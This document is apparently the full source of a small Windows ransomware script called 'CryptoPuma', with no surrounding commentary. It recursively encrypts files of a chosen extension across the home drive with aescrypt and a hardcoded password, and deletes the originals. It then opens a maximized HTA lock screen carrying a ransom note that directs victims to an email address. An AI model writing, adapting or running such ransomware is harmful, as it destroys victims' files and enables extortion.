::Start CryptoPuma
@echo off
mode con:cols=50 lines=2
set pass=3346se9RaIxXF9m45nsmx7nL3bVudn91w4SNY8URDVa

Title CryptorPuma

echo Scanning. . . .
REM Change file extension *.123test for *.doc
FOR /R "%homedrive%\" %%X in (*.123test) DO (
REM echo %%X >> %homedrive%\Original.txt SafeMode
REM Rename "%%X" "%%~nX.bak" >NUL 2>&1 SafeMode   
aescrypt -e -p %pass% "%%X"
del "%%X"
)



REM Block Screen
cls
setlocal
for /F "delims=" %%a in ('mshta.exe "%~F0"') do set "HTA=%%a"

-->

<html>
    <head>
        <title>Attention Please!</title>
    <hta:application id="oBVC" 
                     applicationname="BSOD"  
                     version="1.0" 
                     maximizebutton="no" 
                     minimizebutton="no" 
                     sysmenu="no" 
                     Caption="no" 
                     windowstate="maximize"/> 
    <style>
        #texto2{
            padding-top: 19%;
            letter-spacing: 1px;
            text-align: center;
        }
    </style>
</head>
<body bgcolor="#8c1d1d" scroll="no">
    <font face="Lucida Console" size="4" color="white">
<center><p> - CryptoWindow - </p></center>
<div id="texto2">
    Your databases, files, photos, documents and other important files are encrypted!<br>
    <br><br>
    The only method of recovering files is to get an decrypt software and unique private key.<br>
    <br><br>
    After get the decryptor you will start decrypt software, enter your unique private key and it will decrypt all your data.<br>
    <br><br><br>
   Only we can give you this key and only we can recover your files.
    <br><br>
   You need to contact us by e-mail theblackvaultufofootage@gmail.com send us your personal ID and wait for further instructions.
    <br><br>
   Your personal ID: 3346se9RaIxXF9m45nsmx7nL3bVudn91w4SNY8URDVa
    <br><br>
   Don't try any OTHER solution. ONLY US can decrypt your files. 
    <img id="imagen" alt="Candado" src="https://i.imgur.com/rytGPFG.png" height="130" width="100">
</div>
</body>
</html>